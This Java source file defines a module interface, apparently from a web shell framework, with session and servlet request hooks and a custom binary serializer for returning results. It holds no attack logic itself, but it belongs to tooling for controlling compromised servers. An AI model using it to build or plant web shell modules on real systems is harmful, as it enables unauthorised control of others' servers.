package shells.payloads.java.modules;

import java.util.Map;

/**
 * Payload Module Interface
 * All function modules need to implement this interface
 */
public interface PayloadModule {
    
    /**
     * Set session information
     */
    void setSession(Map session);
    
    /**
     * Set Servlet request object
     */
    void setServletRequest(Object servletRequest);
    
    /**
     * Execute module function
     * @return execution result byte array (serialized format)
     */
    byte[] execute();
    
    /**
     * Get module name
     */
    String getModuleName();
    
    /**
     * Serialize result to payload.java format
     */
    default byte[] serializeResult(Map<String, Object> result) {
        return serializeMap(result);
    }
    
    /**
     * Serialize error message
     */
    default byte[] serializeError(String errorMessage) {
        Map<String, Object> errorResult = new java.util.HashMap<>();
        errorResult.put("status", "error");
        errorResult.put("message", errorMessage);
        return serializeResult(errorResult);
    }
    
    /**
     * Serialize success result
     */
    default byte[] serializeSuccess(Object data) {
        Map<String, Object> successResult = new java.util.HashMap<>();
        successResult.put("status", "success");
        successResult.put("data", data);
        return serializeResult(successResult);
    }
    
    /**
     * Core serialization method (same as payload.java)
     */
    default byte[] serializeMap(Map<String, Object> map) {
        java.io.ByteArrayOutputStream outputStream = new java.io.ByteArrayOutputStream();
        
        for (Map.Entry<String, Object> entry : map.entrySet()) {
            try {
                String key = entry.getKey();
                Object value = entry.getValue();
                
                // Write key
                outputStream.write(key.getBytes());
                
                // Determine value type and write marker
                if (value instanceof byte[]) {
                    outputStream.write(2); // byte array marker
                    byte[] byteValue = (byte[]) value;
                    outputStream.write(intToBytes(byteValue.length));
                    outputStream.write(byteValue);
                } else if (value instanceof Map) {
                    outputStream.write(1); // map marker
                    byte[] serializedMap = serializeMap((Map<String, Object>) value);
                    outputStream.write(intToBytes(serializedMap.length));
                    outputStream.write(serializedMap);
                } else {
                    outputStream.write(2); // default to byte array
                    byte[] byteValue;
                    if (value == null) {
                        byteValue = "NULL".getBytes();
                    } else {
                        byteValue = value.toString().getBytes();
                    }
                    outputStream.write(intToBytes(byteValue.length));
                    outputStream.write(byteValue);
                }
            } catch (Exception e) {
                // Ignore serialization errors
            }
        }
        
        return outputStream.toByteArray();
    }
    
    /**
     * Convert int to 4-byte array
     */
    default byte[] intToBytes(int value) {
        return new byte[] {
            (byte)(value & 0xFF),
            (byte)((value >> 8) & 0xFF),
            (byte)((value >> 16) & 0xFF),
            (byte)((value >> 24) & 0xFF)
        };
    }
}
